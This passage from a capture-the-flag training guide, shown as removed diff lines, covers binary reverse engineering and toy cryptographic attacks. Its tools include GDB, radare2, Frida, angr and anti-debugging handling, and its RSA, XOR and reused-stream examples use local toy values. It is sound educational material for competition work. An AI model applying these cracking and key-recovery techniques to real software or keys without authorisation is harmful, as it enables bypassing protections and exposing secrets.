-r2 -q -c 'izzj' checker > strings.json
-```
-
-Do not add `-d` for static work: it starts a debug process. `-w` opens a writable file and is unnecessary for inspection. If analysis is wrong, inspect bytes with `px 32 @ ADDRESS`, disassemble a bounded region with `pd 12 @ ADDRESS`, and correct function boundaries only after checking where execution actually enters. Command meanings are documented in the [official radare2 reference card](https://book.rada.re/refcard/intro.html).
-
-For JSON, check the decoded value's type and length. A failed command can produce an empty value rather than the list you expected. A `json.loads` error may mean diagnostic output polluted stdout, not that the binary has no functions. The optional `r2pipe` library is not individually listed; batch output above needs no plugin.
-
-## 5. Read decompiled code without trusting invented types
-
-**Windows WSL Ghidra:** launch the supplied Ghidra application, create a local non-shared project, import `chall`, and check the detected language, bitness, endianness, and image base before accepting analysis. Open **Search → For Strings**, select a relevant message, and follow its references into the function. Keep Listing and Decompiler panes visible together.
-
-Rename `local_28` to a factual name such as `input_buffer` only after you have identified its use. Rename an unknown function to `candidate_transform` before claiming it is AES. Set array lengths from actual bounds, distinguish a byte count from an element count, and check signed comparisons in the assembly. Save your project separately from the original file.
-
-| Decompiled appearance | Verify in instructions |
-| --- | --- |
-| `char` becomes negative | `movsx` sign-extends; `movzx` zero-extends |
-| Arithmetic looks unbounded | Register width and truncation at each store |
-| `memcmp` arguments appear missing | Calling convention, register assignments before the call, function prototype |
-| Impossible branch | Flags, unsigned versus signed jump, or earlier mutation |
-| Huge single function | Flattened dispatcher, bad boundaries, exception flow, or VM interpreter |
-| No ordinary calls | Tail jumps, return chains, callbacks, destructors, signal handlers |
-
-Ghidra in the Windows sheet is installed **in WSL**. Its presence there does not establish a Kali installation. Kali's approved radare2 provides the static fallback. `pdg` requires an r2ghidra plugin; radare2 approval alone is not proof that plugin exists. Use `pdf` if it is absent instead of installing it during the event.
-
-## 6. Stop immediately before the comparison
-
-**Windows WSL GDB, Linux x86-64 checker:**
-
-```bash
-gdb -q ./checker
-```
-
-```text
-set disassembly-flavor intel
-break main
-run
-disassemble /r main
-break memcmp
-continue
-```
-
-Enter `AAAA` when the program asks for input. At the relevant `memcmp` call, inspect arguments:
-
-```text
-info registers rdi rsi rdx rip
-x/4bx $rdi
-x/4bx $rsi
-bt
-```
-
-On Linux x86-64 System V, these registers hold the first pointer, second pointer, and length. For this toy the second buffer should be `61 3f 72 3f` and the length 4. Those bytes are **transformed expected data**, not automatically the plaintext answer. Check the call site if other library calls also hit the breakpoint.
-
-On Windows x64, the first arguments are RCX, RDX, R8, R9. On i386 cdecl they are on the stack; immediately before `call`, argument one is at `[esp]`, and at callee entry it is at `[esp+4]`. On ARM A32 use r0–r3; AArch64 uses x0–x7. Register assumptions must match the ABI, not just the CPU family.
-
-For PIE, first `start` or `starti`, inspect `info proc mappings`, and derive the runtime address from the loaded image plus the correct relative offset. With symbols, `break *main+OFFSET` is convenient; replace `OFFSET` with an instruction offset from this binary. Never copy a raw address from an earlier run with ASLR enabled. The [GDB manual](https://sourceware.org/gdb/current/onlinedocs/gdb) documents breakpoints, memory inspection, and process mappings.
-
-**Windows WSL GDB, useful follow-up commands:**
-
-```text
-nexti
-stepi
-finish
-info registers
-x/16i $pc
-x/32bx $sp
-```
-
-`nexti` steps over a call; `stepi` enters it; `finish` runs until the current frame returns. If you need to discover who changes a known byte, set `watch *(unsigned char*)ADDRESS` after replacing `ADDRESS` with the live pointer. Watchpoints are limited resources; watch the meaningful field rather than an entire megabyte.
-
-**Windows native x64dbg:** open a copy of the PE using the matching x32dbg or x64dbg executable, follow the entry point, and find the local comparison or imported comparison routine from the Symbols view. Set a breakpoint, run to it, and inspect the ABI argument registers in Dump. Use a hardware breakpoint on a changed byte when a software `INT3` breakpoint would modify self-checked code. Do not assume hardware breakpoints are invisible to the program.
-
-## 7. When tracing reveals more than decompilation
-
-**Kali, only for a local executable you intend to run:**
-
-```bash
-ltrace -s 256 -o library.log ./chall
-strace -f -s 256 -o syscalls.log ./chall
-rg -n 'strcmp|memcmp|open|read|write|ptrace|mprotect|execve' library.log syscalls.log
-```
-
-`ltrace` can expose imported function arguments; static linking, inlining, direct syscalls, or custom routines can hide them. `strace` shows kernel interactions, including child processes with `-f`. Neither tool proves that a missing call never occurred through another implementation. A file-open failure can reveal the expected working directory or companion filename.
-
-**Kali Frida:** use this observation-only script when the binary imports `memcmp`. Save it as `compare.js`.
-
-```javascript
-const address = Module.findGlobalExportByName('memcmp');
-if (address === null) {
-  console.log('memcmp is not exported in this process');
-} else {
-  Interceptor.attach(address, {
-    onEnter(args) {
-      const length = args[2].toUInt32();
-      if (length === 0 || length > 128) return;
-      try {
-        console.log('length=' + length);
-        console.log(hexdump(args[0], { length: length, ansi: false }));
-        console.log(hexdump(args[1], { length: length, ansi: false }));
-      } catch (error) {
-        console.log('unreadable comparison: ' + error);
-      }
-    }
-  });
-}
-```
-
-```bash
-frida -f ./chall -l compare.js
-```
-
-Enter the challenge input through the terminal as appropriate for the supplied Frida CLI. Check `frida --help` if its process/input behavior differs. If the library loads later, attach after it is mapped or observe module loading; do not silently accept “no export” as “no comparison.” The script uses the current API spelling from [Frida's JavaScript documentation](https://frida.re/docs/javascript-api/).
-
-## 8. Write down the transform before solving it
-
-Use a table with one row per stage: source bytes, operation, width, key/state, destination. Keep the exact comparison direction: `transform(input) == stored` requires inversion, while `input == transform(stored)` requires forward evaluation.
-
-**Windows WSL Python; Kali after interpreter check:**
-
-```python
-def rol8(value, amount):
-    amount %= 8
-    return ((value << amount) | (value >> ((8 - amount) % 8))) & 0xff
-
-def ror8(value, amount):
-    return rol8(value, -amount)
-
-for value in range(256):
-    for amount in range(8):
-        assert ror8(rol8(value, amount), amount) == value
-print('all byte rotations round-trip')
-```
-
-For XOR, applying the same key again reverses it. For addition modulo 256, subtract and mask. Reverse a permutation with the inverse index map. For a stateful cipher, restore the complete state before testing the next candidate; reusing mutated state creates plausible-looking wrong output. A non-bijective substitution can have several preimages: retain all candidates until later constraints eliminate them.
-
-A repeated prefix hash can permit byte-by-byte search if each prefix digest is independently known. A single full cryptographic hash generally does not. A branch count or timing oracle must first show a consistent relationship to correct prefixes, with repeated baselines and randomized candidate order. Avoid treating the slowest single run as proof.
-
-### Mixed Boolean-arithmetic expressions
-
-Expressions such as `(x ^ y) + 2*(x & y)` implement `x+y` at a fixed width. Simplifying them can reveal an ordinary checksum hidden in a large expression. Record the width and signedness, simplify one expression, then compare original and replacement on boundary values and many random inputs. Random agreement is a useful check, not a mathematical proof of equivalence. For small widths, exhaustive checking is stronger.
-
-**Windows WSL Python, complete 8-bit check:**
-
-```python
-for x in range(256):
-    for y in range(256):
-        original = ((x ^ y) + 2 * (x & y)) & 255
-        replacement = (x + y) & 255
-        assert original == replacement
-print('equivalent for all 8-bit pairs')
-```
-
-The source's msynth/Miasm workflow is a specialized option, not a required installed tool. The manual identity and equivalence check survive without it. Solver-backed synthesis, deobfuscation plugins, and an oracle database each have separate availability requirements.
-
-## 9. Anti-analysis: preserve the real semantics
-
-Start by comparing one normal run with one instrumented run using the same input. Locate the first meaningful divergence. Patching every conditional jump can make a validator print success without recovering the answer.
-
-| Evidence | Human investigation | Common wrong conclusion |
-| --- | --- | --- |
-| `ptrace`, `TracerPid`, PEB flags | Identify the exact return value or branch consumed | All anti-debugging is a single imported function |
-| Time or instruction-counter state | Determine whether time changes the key or merely gates progress | Skipping a delay preserves cryptographic state |
-| SIGILL/SIGFPE/SIGTRAP handlers | Trace handler and saved context changes | The first signal is an ordinary crash |
-| Parent and child processes | Follow both and inspect writes between them | The child on disk contains its final instructions |
-| Writes to executable pages | Dump after decoding, before erasure | A static disassembly describes every later instruction |
-| TLS callbacks / constructors / destructors | Analyze startup and teardown too | All validation occurs under `main` |
-| Stack-based call-less chaining | Follow saved frame and return pointers | No `call` instruction means no function dispatch |
-
-**Windows WSL GDB, only after proving a handler is intended:**
-
-```text
-info signals SIGILL SIGFPE SIGTRAP
-handle SIGILL nostop noprint pass
-handle SIGFPE nostop noprint pass
-set follow-fork-mode child
-set detach-on-fork off
-info inferiors
-```
-
-Do not broadly pass SIGTRAP without understanding debugger breakpoints. Signal-driven code may mutate instructions, adjust the saved PC, or switch decoding modes. For a parent that writes the child's text with `process_vm_writev`, Kali `strace -f` can expose the mechanism; exact dumped bytes may require a larger recorded string limit and careful parsing.
-
-Dump a measured interval in GDB with `dump binary memory decoded.bin START END`, replacing both addresses with mapped runtime bounds. Record the base address alongside the dump. Reimporting at address zero loses pointer relationships. Integrity checks can detect patches and software breakpoints; emulation or observing after the check may preserve more behavior than editing code.
-
-## 10. Custom VMs and emulation
-
-A VM is an interpreter plus a bytecode program. Recover its state before naming every opcode: program counter, registers or operand stack, memory, flags, and input/output operations. Find the dispatch loop, log one instruction's before/after state, and build a table of operand lengths and effects. Compare two runs differing in one input byte to locate the first dependent bytecode region.
-
-**Windows WSL Python; complete tiny VM with no extra libraries:**
-
-```python
-# Opcodes: 1=load immediate, 2=XOR immediate, 3=add immediate, 4=emit, 255=halt.
-program = bytes([1, 0x61, 2, 0x31, 3, 0, 4,
-                 1, 0x3d, 2, 0x71, 3, 0, 4, 255])
-pc, accumulator = 0, 0
-output = bytearray()
-steps = 0
-while pc < len(program):
-    steps += 1
-    if steps > 100: raise RuntimeError('instruction budget exhausted')
-    at = pc
-    opcode = program[pc]
-    pc += 1
-    if opcode == 255:
-        break
-    if opcode in (1, 2, 3):
-        if pc >= len(program): raise ValueError('truncated operand')
-        operand = program[pc]
-        pc += 1
-        if opcode == 1: accumulator = operand
-        elif opcode == 2: accumulator ^= operand
-        else: accumulator = (accumulator + operand) & 255
-    elif opcode == 4:
-        output.append(accumulator)
-    else:
-        raise ValueError(f'unknown opcode {opcode} at {at}')
-    print(f'pc={at:02x} op={opcode:02x} a={accumulator:02x}')
-assert bytes(output) == b'PL'
-print(output.decode())
-```
-
-The final output is `PL`. A real VM may use variable-length instructions, encoded opcodes, channels between threads, or self-modifying bytecode. Keep program memory writable in the model when STORE can alter instructions. For concurrent interpreters, record message ordering and blocking conditions; arbitrary round-robin scheduling is not automatically equivalent.
-
-| Model | Choose it when | State you must supply |
-| --- | --- | --- |
-| Small Python interpreter | Only a handful of VM instructions matter | Exact opcode semantics and integer widths |
-| radare2 ESIL, Kali | A supported short native routine can be isolated | Registers, stack, memory, stop condition; verify instruction coverage |
-| Unicorn, conditional non-AI library | Raw foreign CPU code is the obstacle | Mapped pages, architecture/mode, registers, memory and syscall/MMIO stubs |
-| Qiling, conditional non-AI library | OS calls and filesystem behavior matter | Compatible root filesystem and accurate API behavior |
-| angr, Kali approved row 13 | Input constraints lead to a small set of branches | Input model, success/failure conditions, bounds and realistic environment |
-
-Unicorn/Qiling are not individually listed as preinstalled. Their library status does not supply missing firmware, OS images, or separate emulators. `qemu-img` approval covers disk-image tooling; it does not establish approval or installation of every `qemu-system-*` or `qemu-user-*` executable.
-
-For Unicorn, map page-aligned code and stack, use a finite instruction budget, and stop at the function's return boundary. An invalid fetch usually means a bad PC or return address; an invalid read/write often means missing data, incorrect ABI arguments, or wrong pointer width. Do not “fix” every fault by mapping zero pages: that can conceal an incorrect model.
-
-Snapshotting registers alone does not reset memory. Restore dirty pages and peripheral state between candidates. ARM Thumb needs the correct execution mode; MIPS needs endianness and delay-slot semantics; mixed x86 modes require compatible register and memory transfer. CPU emulation does not implement operating-system syscalls. MMIO reads need meaningful device behavior, such as a changing ready bit, rather than arbitrary constants.
-
-## 11. Symbolic execution as a bounded experiment
-
-Use symbolic execution after you know the checker's input shape. Avoid launching unconstrained exploration over an entire GUI or runtime. A solver model reaching a success address is a candidate input; replay it through the original file before accepting it.
-
-**Kali, approved angr environment, with its Python import confirmed:**
-
-```bash
-python3 -c 'import angr, claripy; print(angr.__version__)'
-```
-
-A failed import can mean angr lives in an isolated pipx environment. Use the interpreter provided with that environment rather than assuming system Python shares its packages. If it cannot be located, continue with the byte-transform solver above.
-
-Save as `solve_checker.py`; this is specific to the complete `checker.c` example, including its four-byte input and messages.
-
-```python
-import angr
-import claripy
-
-project = angr.Project('./checker', auto_load_libs=False)
-characters = [claripy.BVS(f'c{i}', 8) for i in range(4)]
-content = claripy.Concat(*characters, claripy.BVV(b'\n'))
-stream = angr.SimFileStream(name='stdin', content=content, has_end=True)
-state = project.factory.full_init_state(args=['./checker'], stdin=stream)
-for character in characters:
-    state.solver.add(character >= 0x20, character <= 0x7e)
-manager = project.factory.simulation_manager(state)
-manager.explore(find=lambda s: b'correct\n' in s.posix.dumps(1),
-                avoid=lambda s: b'wrong' in s.posix.dumps(1), n=1000)
-if not manager.found:
-    raise SystemExit('No solution within this exploration budget; inspect states')
-answer = manager.found[0].solver.eval(claripy.Concat(*characters), cast_to=bytes)
-print(answer.decode('ascii'))
-```
-
-Expected candidate: `PLAN`. `n=1000` bounds exploration rounds, not wall-clock runtime; interrupt a stalled run rather than letting it consume the session. If a target reads argv, models a file, or requires more input, change the model accordingly. Hooks must preserve the behavior relevant to the check; replacing a hash with a success constant makes a false solver. File and stream modeling are covered in the [angr filesystem documentation](https://api.angr.io/en/v9.2.112/advanced-topics/file_system.html).
-
-## 12. Language and platform routes
-
-| Target | Approved starting route | What to recover before solving |
-| --- | --- | --- |
-| Python `.pyc` | Kali pycdc/uncompyle6/unpyc3; WSL matching Python `dis` when available | Interpreter version, constants, nested code objects, opcode mapping |
-| PyInstaller | Kali pyinstxtractor-ng | Embedded archive, Python version, actual application module |
-| .NET | Windows native dnSpyEx | Entry method, resources, initializer, decryptor, comparison |
-| APK/DEX | Kali jadx and Apktool | Java/Kotlin entry flow, resources, native methods, ABI-specific `.so` |
-| Electron | Kali approved `asar` utility | `app.asar`, main/preload scripts, native addon boundary |
-| Go | Kali GoReSym; radare2 or WSL Ghidra | Runtime versus user functions, string pointer/length pairs, goroutines |
-| Rust | WSL Ghidra or Kali radare2 | Slice lengths, enum tags, panic paths, JSON field names |
-| Swift/Kotlin/C++ | WSL Ghidra; Kali jadx for JVM bytecode | Witness tables, coroutine state, vtables/RTTI, destructors |
-| WASM / exotic bytecode | Local bytes, strings, small interpreter | Linear memory, imports, instruction encoding, host interaction |
-| Godot/Roblox/Unity | Inspect supplied assets and scripts first | Resource container, script format, engine/native boundary |
-| Firmware / drivers | Kali radare2; WSL Ghidra, binwalk where appropriate | Architecture, load address, entry point, device interfaces |
-
-These are investigation routes, not claims that every specialized decompiler is installed. Flutter/IL2CPP, HarmonyOS ABC, Pyarmor, macOS/iOS, SGX, and proprietary game formats may require tooling absent from the approved list. Preserve the structural reasoning; use approved static tools and challenge-provided resources, or defer that route.
-
-**Kali APK, static extraction:**
-
-```bash
-jadx -d jadx-out challenge.apk
-apktool d challenge.apk -o apk-out
-rg -n 'native |loadLibrary|RegisterNatives|flag|secret|check' jadx-out apk-out
-```
-
-When Java calls `native check(...)`, locate the corresponding `lib/<abi>/*.so`. Dynamic registration maps method names and signatures to native function pointers. Android `.so` files may depend on bionic, JNI objects, initialization, and ARM instructions; loading one into desktop Linux with `ctypes.CDLL` is not a general substitute for an Android runtime. Certificates, assets, or logged values can be key material; reproduce exact hashing and byte encodings.
-
-**Kali UPX, work on a copy:**
-
-```bash
-cp chall chall.work
-upx -t chall.work
-upx -d chall.work
-rabin2 -I chall.work
-```
-
-Failure can mean unsupported UPX, a modified header, or no UPX at all. It is not a reason to patch magic bytes blindly. For a custom packer, identify the decoding loop and inspect memory after it runs.
-
-## 13. Recognize the less common patterns
-
-| Pattern in the source collection | Useful observation and next step |
-| --- | --- |
-| Multi-layer decryptor / RC4 gate plus VM | Solve and dump one layer at a time; feed the original verified output into the next layer |
-| S-box/SPN constants / GF(2^8) elimination | Extract tables exactly; XOR is addition in the field, and multiplication needs the observed reduction polynomial |
-| Sliding-window popcount | Adjacent count differences constrain the leaving/entering bits; enumerate only the initial window |
-| Decision-tree validator | Convert accepted leaves into constraints rather than reversing every repeated branch |
-| CVP/LLL integer validator | Preserve coefficient widths and bounds; a nearby lattice vector still needs original-checker validation |
-| Prefix key-chain VM | Each recovered block initializes the next; rollback all state when a candidate fails |
-| GBA meet-in-the-middle hash | Separate forward/backward states at a real invertible boundary and retain collision candidates |
-| Sprague-Grundy game | Recover legal moves and terminal states, then compute mex values; the winning input is game logic |
-| Kernel-module maze | Extract transitions from the module and solve the graph without loading an unknown driver |
-| ROPfuscation / return-chain obfuscation | Treat stack words as the instruction stream and track gadget side effects |
-| Image XOR / Newton convergence / PE bitmap | The program may generate an image rather than compare a string; recover dimensions, bit order, and palette |
-| Quadtree image parser | Recurse using the encoded subdivision rule; validate consumed length and leaf coordinates |
-| GLSL texture VM | Separate program memory from rendered output; handle STORE and scheduling effects explicitly |
-| Font ligatures / LED Morse / GPIO LCD | Decode the output protocol: glyph substitutions, timing units, enable edges, command/data bits |
-| BWT without a terminator | Recover rotations and use the checker's external ordering constraints to select the valid one |
-| CRT plus matrix lookup | Solve modular constraints first, then reproduce lookup/index conventions |
-| Brainfuck / FRACTRAN / Make VM / OPAL / Glulx | Identify state transitions and input-dependent comparisons before adopting a full language runtime |
-| Unusual ROM / custom opcode / KVM HLT chaining | Inspect the emulator or handler implementing the instruction, not only a generic ISA manual |
-| Cortex peripheral AES / MIPS coprocessor crypto | Memory-mapped registers or coprocessor calls may perform the cryptography outside ordinary ALU code |
-| Bootloader / real-mode x86 / ARM in pixels | Recover load base, segment/mode, and byte packing before disassembly |
-| Backdoored library / binary diff | Compare equivalent builds, strings and changed functions; startup and exported wrappers deserve attention |
-| Date-derived key / instruction counter | Preserve the exact clock or counter state used by the transform |
-| Destructor-hidden or MFC event validation | Trace object teardown or event dispatch as part of the main control flow |
-| EBCDIC SAVF / DOS stub / embedded ZIP | Identify the actual nested representation and decode it locally |
-
-AI/ML inversion examples in the source are not competition workflows here: the event's AI/ML restriction takes priority. Likewise, historical C2 enumeration and cloud-function examples do not authorize contacting unrelated services. Study their local control/data-flow lesson only.
-
-## 14. A useful stopping point and a reproducible handoff
-
-Keep the original hash, exact tool/environment, relevant function addresses, transformation pseudocode, extracted constants, solver script, and original-program validation result. Describe unresolved assumptions explicitly. If a patch only displays “correct,” say so; it is not a recovered flag unless the task explicitly asks for a patch.
-
-| Failure | First correction |
-| --- | --- |
-| “Exec format error” | Match architecture/format; continue static analysis instead of installing an emulator |
-| Existing ELF reports “No such file” | Inspect its requested interpreter/loader and supplied runtime |
-| Breakpoint never hits | Verify image base, process/thread, optimization, inline comparison, and delayed library load |
-| Solver returns printable nonsense | Recheck direction, endian order, widths, and whether the expected table was a decoy |
-| Emulator hangs | Find the polling condition, missing interrupt, wrong branch semantics, or incorrect stop address |
-| A dump will not decompile | Record its runtime base and segment permissions; raw data has no loader metadata |
-| Decompiler disagrees with a run | Inspect the exact instructions, mutated code, ABI and hidden handlers |
-
-Source map: `ctf-reverse/SKILL.md`, `tools.md`, `radare2-r2pipe.md`, `tools-dynamic.md`, `tools-emulation.md`, `tools-advanced.md`, `tools-advanced-2.md`, `mba-simplification.md`, `anti-analysis.md`, `anti-analysis-ctf.md`, `patterns.md`, `patterns-runtime.md`, `patterns-ctf.md`, `patterns-ctf-2.md`, `patterns-ctf-3.md`, `languages.md`, `languages-platforms.md`, `languages-compiled.md`, `platforms.md`, `platforms-hardware.md`, `unicorn-emulation.md`, and `field-notes.md`. Paths after the first share the `ctf-reverse/` prefix. The source `ctf-reverse/tools-mcp.md` is retained as provenance only; its agent integration and unapproved-tool setup are excluded from the human workflow.
-
-
----
-
-<a id="07-cryptography"></a>
-
-# Cryptography: recover the structure before the secret
-
-A crypto challenge usually supplies an algorithm, parameters, ciphertext, or a query service. Your first task is to translate those into an exact mathematical statement. A recognizable number size or file extension is a clue; it is not an attack.
-
-This chapter gives runnable local examples for common cases. [Advanced cryptography](#14-advanced-crypto) preserves the repository's lattice, elliptic-curve, polynomial, proof-system, post-quantum, and unusual algebra topics with diagnostics and constraints.
-
-## 1. Environment and notation
-
-**Windows:** open WSL and use the listed Python 3, OpenSSL, and RsaCtfTool installations. Native Windows Python is not assumed. **Kali:** Python is used throughout; the sheet lists crypto-attacks at `/opt/tools/crypto-attacks`, hlextend, hashcat, John, and other tools. Check the actual interpreter and tool before relying on them.
-
-SageMath is approved on Kali, but the workbook records no installation information. Treat it as optional: try `sage --version`, and keep the standard-library examples below as fallbacks for basic arithmetic. Do not use a blanket installer. The Windows sheet permits adding non-AI Python libraries; it does not authorize rejected standalone tools or online services, or establish the same installation permission on Kali. On Kali, check provisioned dependencies.
-
-Factordb-python is listed on Kali. That is not authorization to send challenge moduli to the FactorDB website. Keep factoring local. Do not use online hash-cracking, online mathematical solvers, AI tools, or public challenge uploads.
-
-```bash
-python3 --version
-python3 -c "import sys; print(sys.executable); print(pow(3, -1, 11))"
-```
-
-Expected inverse: `4`, because `3*4 % 11 == 1`. Modular inverses require coprime inputs; an exception is meaningful evidence, not a reason to switch to floating point.
-
-| Symbol | Meaning | Common error |
-|---|---|---|
-| `n` | RSA modulus or a group order, depending on context | Confusing the field prime with the subgroup order |
-| `p`, `q` | Usually primes | Assuming repeated or composite factors are impossible |
-| `e`, `d` | Public and private exponents | Inverting modulo `n` instead of the appropriate group exponent |
-| `m`, `c` | Integer message and ciphertext | Losing leading zero bytes |
-| `k` | Nonce, key, or multiplier | Reusing a variable for unrelated quantities |
-| `^` | XOR in Python; exponentiation in Sage preparsed files | Copying syntax between interpreters |
-
-Every Python block with a filename below is a complete local demonstration. Save it and run `python3 filename.py`. Replace toy values only after the assertions pass.
-
-## 2. Triage worksheet
-
-Record these before choosing an attack:
-
-```text
-Artifact: source / text / binary / capture / query service
-Encoding: hex / base64 / decimal integers / raw bytes
-Known values: ______________________________
-Unknown values: ____________________________
-Equation or state update: __________________
-Oracle input and exact response: ___________
-Query limit / reset behavior: ______________
-Verification equation: _____________________
-```
-
-Read source in execution order. Trace key generation, serialization, padding, nonce generation, encryption/signing, and verification. Check whether two apparently separate operations share a secret or RNG state. A cryptographically strong primitive can be surrounded by a weak protocol.
-
-| Observation | First local check | Next branch |
-|---|---|---|
-| Small `e`, short unpadded message | Exact integer root | RSA low-exponent section |
-| Several RSA moduli | Pairwise GCD | Shared factors |
-| Several encryptions of the same message | Compare modulus/exponent relationships | Common modulus or broadcast |
-| Repeated nonce or IV | Compare ciphertext XOR and tags | Stream or authenticated-encryption analysis |
-| Equal 16-byte ciphertext blocks | Count block repetitions | ECB hypothesis |
-| Distinct decryption errors | Repeat controlled malformed samples | Padding/error oracle |
-| Repeated signature `r` | Compare messages and signatures | Nonce reuse |
-| Numeric outputs from a PRNG | Check exact bit widths and output transformation | LCG, MT, LFSR, or constraint model |
-| Approximate linear equations modulo `q` | Estimate error bound | Lattice chapter |
-
-## 3. Bytes, integers, and encodings
-
-Save as `bytes_basics.py`:
-
-```python
-import base64
-
-original = b'\x00CTF{toy}'
-value = int.from_bytes(original, 'big')
-recovered = value.to_bytes(len(original), 'big')
-assert recovered == original
-assert bytes.fromhex(original.hex()) == original
-assert base64.b64decode(base64.b64encode(original), validate=True) == original
-print(original.hex())
-print(value)
-print(recovered)
-```
-
-Expected final line: `b'\x00CTF{toy}'`. If you choose output length solely from `bit_length`, the initial zero disappears. For RSA, use the modulus byte length when inspecting padded plaintext; trim only after recognizing the padding format.
-
-Hex and base64 are encodings, not encryption. Decode one layer into a new file and inspect its header and length. Arbitrarily repeating decoders can turn random data into misleading printable fragments.
-
-## 4. Classical ciphers and XOR
-
-For substitution and transposition, preserve punctuation, spacing, alphabet, and repeated groups. Compare character frequencies and repeated distances. A long alphabetic text supports frequency analysis; a short random flag often does not.
-
-For Vigenère, test plausible key lengths using repeated distances and coincidence statistics, then analyze each residue class separately. For book ciphers, establish the exact edition, tokenization, indexing base, and whether punctuation counts. For Polybius/Nihilist/pigpen/semaphore, identify the symbol alphabet before forcing ASCII.
-
-Save as `xor_known_plaintext.py`:
-
-```python
-def xor(a, b):
-    if len(a) != len(b):
-        raise ValueError('equal lengths required')
-    return bytes(x ^ y for x, y in zip(a, b))
-
-key = b'ICE'
-plain = b'CTF{repeat_xor_is_not_a_pad}'
-cipher = bytes(c ^ key[i % len(key)] for i, c in enumerate(plain))
-known = b'CTF'
-recovered_key = xor(cipher[:len(known)], known)
-recovered = bytes(c ^ recovered_key[i % len(recovered_key)]
-                  for i, c in enumerate(cipher))
-assert recovered_key == key
-assert recovered == plain
-print(recovered.decode())
-```
-
-This works because the known plaintext covers the entire repeating key at the correct alignment. If the key is longer, those bytes reveal only part of it. Validate a candidate key against file structure, checksum, or several independent known bytes, not just a guessed flag prefix.
-
-For single-byte XOR, all 256 candidates are cheap locally. Score printable text and expected structure; do not select the first candidate containing a brace. For repeating XOR, compare several key lengths and penalize overly long keys that merely fit a guessed prefix.
-
-### Reused one-time pad or stream nonce
-
-For equal-length streams, `c1 XOR c2 = p1 XOR p2`. It removes the reused keystream, not both plaintexts at once.
-
-Save as `reused_stream.py`:
-
-```python
-from hashlib import sha256
-
-def xor(a, b):
-    assert len(a) == len(b)
-    return bytes(x ^ y for x, y in zip(a, b))
-
-p1 = b'known message 01'
-p2 = b'secret message!!'
-assert len(p1) == len(p2)
-stream = sha256(b'toy reused stream').digest()[:len(p1)]
-c1, c2 = xor(p1, stream), xor(p2, stream)
-recovered = xor(xor(c1, c2), p1)
-assert recovered == p2
-print(recovered)
-```
-
-If output is nonsense, check offsets, encoding, compression, and whether nonce reuse actually produced the same key stream. Load-balanced servers may use different keys or counters; group samples by backend evidence before comparing them.
-
-## 5. Reusable exact arithmetic
-
-Save this as `math_helpers.py`. Later examples import it from the same directory.
-
-```python
-from math import gcd, prod
-
-def iroot(value, degree):
-    """Return floor(value**(1/degree)) using integer arithmetic."""
-    if value < 0 or degree < 1:
-        raise ValueError('nonnegative value and positive degree required')
-    lo, hi = 0, 1
-    while hi ** degree <= value:
-        hi *= 2
-    while lo + 1 < hi:
-        mid = (lo + hi) // 2
-        if mid ** degree <= value:
-            lo = mid
-        else:
-            hi = mid
-    return lo
-
-def egcd(a, b):
-    old_r, r = a, b
-    old_s, s = 1, 0
-    old_t, t = 0, 1
-    while r:
-        q = old_r // r
-        old_r, r = r, old_r - q*r
-        old_s, s = s, old_s - q*s
-        old_t, t = t, old_t - q*t
-    return old_r, old_s, old_t
-
-def crt(residues, moduli):
-    if len(residues) != len(moduli) or not moduli:
-        raise ValueError('one residue per modulus required')
-    for i, a in enumerate(moduli):
-        if a <= 1 or any(gcd(a, b) != 1 for b in moduli[:i]):
-            raise ValueError('pairwise coprime moduli greater than one required')
-    total = prod(moduli)
-    result = 0
-    for residue, modulus in zip(residues, moduli):
-        partial = total // modulus
-        result += residue * partial * pow(partial, -1, modulus)
-    return result % total
-
-if __name__ == '__main__':
-    assert iroot(27, 3) == 3 and iroot(28, 3) == 3
-    assert iroot(0, 3) == 0
-    assert crt([2, 3, 2], [3, 5, 7]) == 23
-    g, a, b = egcd(17, 13)
-    assert g == 1 and 17*a + 13*b == 1
-    print('exact arithmetic checks passed')
-```
-
-Run `python3 math_helpers.py`. Never use `int(c ** (1/3))` on large RSA integers: floating-point precision makes it unreliable.
-
-## 6. RSA with known factors
-
-Save as `rsa_known_factors.py`:
-
-```python
-from math import gcd, lcm
-
-p, q, e = 61, 53, 17
-n = p*q
-lam = lcm(p-1, q-1)
-assert gcd(e, lam) == 1
-d = pow(e, -1, lam)
-m = 65
-c = pow(m, e, n)
-recovered = pow(c, d, n)
-assert p*q == n
-assert recovered == m
-assert pow(recovered, e, n) == c
-print(n, c, recovered)
-```
-
-Expected output: `3233 2790 65`. Re-encryption is the essential verification. For multiple distinct primes, use the LCM of each `p_i-1`. For repeated prime powers, use the correct totient/group structure; `(p-1)*(q-1)` is wrong when `p == q`.
-
-If `gcd(e, lambda(n)) != 1`, there is no unique private exponent of this form. Factor the modulus and recover all appropriate roots; select using format and re-encryption. See the advanced chapter rather than silently choosing an invalid inverse.
-
-### Shared factors and close primes
-
-Save as `rsa_factor_checks.py`:
-
-```python
-from math import gcd, isqrt
-
-moduli = [101*113, 101*127, 131*137]
-hits = []
-for i, n in enumerate(moduli):
-    for j in range(i):
-        p = gcd(n, moduli[j])
-        if 1 < p < n:
-            hits.append((j, i, p))
-assert hits == [(0, 1, 101)]
-print('shared:', hits)
-
-def fermat(n, budget=10000):
-    if n % 2 == 0:
-        return 2, n//2
-    a = isqrt(n)
-    if a*a < n:
-        a += 1
-    for _ in range(budget):
-        delta = a*a - n
-        b = isqrt(delta)
-        if b*b == delta:
-            return a-b, a+b
-        a += 1
-    return None
-
-factors = fermat(1009*1013)
-assert factors == (1009, 1013)
-print('close primes:', factors)
-```
-
-For many keys, pairwise GCD is quadratic; use a local batch-GCD implementation from approved crypto-attacks after validating its inputs. Duplicate moduli produce `gcd == n`, which is not a new factor. Fermat is useful when primes are close; an exhausted budget is a reason to pivot.
-
-### Small exponent, common modulus, broadcast
-
-Save as `rsa_structural.py`, beside `math_helpers.py`:
-
-```python
-from math_helpers import iroot, egcd, crt
-
-# Case 1: no modular wraparound.
-m, e, n = 42, 3, 1000003*1000033
-c = pow(m, e, n)
-root = iroot(c, e)
-assert root**e == c and root == m
-print('small exponent:', root)
-
-# Case 2: same message and modulus, coprime exponents.
-n, e1, e2, m = 101*113, 3, 7, 42
-c1, c2 = pow(m, e1, n), pow(m, e2, n)
-g, a, b = egcd(e1, e2)
-assert g == 1
-recovered = pow(c1, a, n) * pow(c2, b, n) % n
-assert recovered == m
-assert pow(recovered, e1, n) == c1
-print('common modulus:', recovered)
-
-# Case 3: same unpadded message under three coprime moduli.
-moduli = [101*113, 107*131, 137*149]
-m, e = 42, 3
-cs = [pow(m, e, modulus) for modulus in moduli]
-combined = crt(cs, moduli)
-recovered = iroot(combined, e)
-assert recovered**e == combined and recovered == m
